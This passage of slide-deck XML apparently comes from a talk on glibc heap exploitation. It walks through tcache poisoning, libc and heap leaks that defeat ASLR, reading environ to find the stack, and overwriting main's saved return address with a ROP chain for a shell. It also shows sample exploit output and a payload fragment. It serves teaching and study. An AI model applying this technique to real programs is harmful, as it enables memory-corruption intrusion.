              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>↓</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="Google Shape;164;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="4407408"/>
            <a:ext cx="347472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5  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>environ → stack leak</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name="Google Shape;165;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3977639" y="4407408"/>
            <a:ext cx="457200" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="45700" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="54850">
            <a:sp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a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="166" name="Google Shape;166;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="4407408"/>
            <a:ext cx="658368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0" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>tcache poison reads &amp;environ from libc → stack ptr</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167" name="Google Shape;167;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="4946904"/>
            <a:ext cx="274320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1400">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>↓</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="168" name="Google Shape;168;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="5166360"/>
            <a:ext cx="347472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6  </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>overwrite main's RIP</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="169" name="Google Shape;169;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3977639" y="5166360"/>
            <a:ext cx="457200" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="45700" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="54850">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>→</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="170" name="Google Shape;170;p10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="5166360"/>
            <a:ext cx="6583680" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 16667" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="21262D"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:miter lim="8000"/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="ctr" bIns="54850" lIns="109725" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="54850">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ROP chain on the saved return address → shell</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="171" name="Google Shape;171;p10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="6035040"/>
            <a:ext cx="54864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rgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>traps hide in steps 3–6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176" name="Shape 176"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="177" name="Google Shape;177;p11"/>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III · LIVE</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="178" name="Google Shape;178;p11"/>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11 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="179" name="Google Shape;179;p11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9997445" y="5671753"/>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
        <p:nvSpPr>
          <p:cNvPr id="180" name="Google Shape;180;p11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1005840"/>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000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="3000">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Two leaks, no ASLR left</a:t>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="181" name="Google Shape;181;p11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1783080"/>
            <a:ext cx="11155680" cy="2834640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1613"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="1929384"/>
            <a:ext cx="10753344" cy="254203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 make run</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lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>[+] libc base : 0x7f2590945000   (unsorted-bin fd = &amp;main_arena.bins[0])</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lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>[+] heap base : 0x1decf000       (lone freed chunk leaks addr &gt;&gt; 12)</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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># libc leak  -&gt; beats ASLR on the library</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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># heap leak  -&gt; lets us forge safe-linked fd (need addr&gt;&gt;12)</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="183" name="Google Shape;183;p11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="4846320"/>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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>A single unsorted-bin chunk points into main_arena; a single freed tcache chunk hands back its own address, shifted. Two frees, ASLR is over.</a:t>
            </a:r>
            <a:endParaRPr sz="15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188" name="Shape 188"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="189" name="Google Shape;189;p12"/>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III · TRAP 1/3</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="190" name="Google Shape;190;p12"/>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12 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="191" name="Google Shape;191;p12"/>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Trap 1 — aligned_OK: poison to RIP-8, not RIP</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="192" name="Google Shape;192;p12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1417320"/>
            <a:ext cx="11155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lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>tcache_get rejects any returned chunk whose address isn't 16-byte aligned. Saved return addresses usually aren't.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="193" name="Google Shape;193;p12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2286000"/>
            <a:ext cx="7040880" cy="2468880"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1852"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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="2432304"/>
            <a:ext cx="6638544" cy="217627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5484D"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>target = saved_rip        # e.g. …318  (8 mod 16)  -&gt; REJECTED</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lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>target = saved_rip - 8    # …310      (16-aligned) -&gt; OK</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300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># then write 8 bytes of filler, THEN the value:</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payload = p64(junk) + p64(new_rip)</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="195" name="Google Shape;195;p12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="2377440"/>
            <a:ext cx="393192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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Aim one slot low.</a:t>
            </a:r>
            <a:endParaRPr sz="1500">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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Overwrite the slot you don't care about with filler…</a:t>
            </a:r>
            <a:endParaRPr sz="1500">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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» …and the real target with the run after it.</a:t>
            </a:r>
            <a:endParaRPr sz="15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00" name="Shape 200"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="201" name="Google Shape;201;p13"/>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III · TRAP 2/3</a:t>
            </a:r>
            <a:endParaRPr sz="1100">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="202" name="Google Shape;202;p13"/>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13 / 27</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="203" name="Google Shape;203;p13"/>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Trap 2 — the key-zero eats one quadword</a:t>
            </a:r>
            <a:endParaRPr sz="3400">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="204" name="Google Shape;204;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1417320"/>
            <a:ext cx="11155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lang="en-US" sz="1700">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>On return, tcache_get zeroes the chunk's key field at target+8. Your clean arbitrary write silently loses 8 bytes.</a:t>
            </a:r>
            <a:endParaRPr sz="1700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="205" name="Google Shape;205;p13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2286000"/>
            <a:ext cx="11155680" cy="2331720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 1961"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="704088" y="2432304"/>
            <a:ext cx="10753344" cy="203911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returned chunk @ target</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  target+0x00 : [ your data ]</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250"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>  target+0x08 : [ 0x0000000000000000 ]   &lt;-- zeroed by tcache_get (key slot)</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250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <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 lay out the write so the sacrificial quadword lands on the key,</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 not on the byte you actually need.</a:t>
            </a:r>
            <a:endParaRPr sz="1250">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="207" name="Google Shape;207;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="489204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800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr i="1" lang="en-US" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>This is why your arbitrary write "mysteriously" nulls 8 bytes one quadword in.</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208" name="Google Shape;208;p13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="5440680"/>
            <a:ext cx="10241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E3B341"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>① </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>tcache_get zeroes 8 bytes at target+8 when it returns the chunk.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>② </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Aim at RIP−8 → the zero lands on RIP, but your ROP chain overwrites it anyway. Traps 1 + 2 cancel.</a:t>
            </a:r>
            <a:endParaRPr sz="1200">
              <a:solidFill>
                <a:srgbClr val="E6E8EB"/>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13" name="Shape 213"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
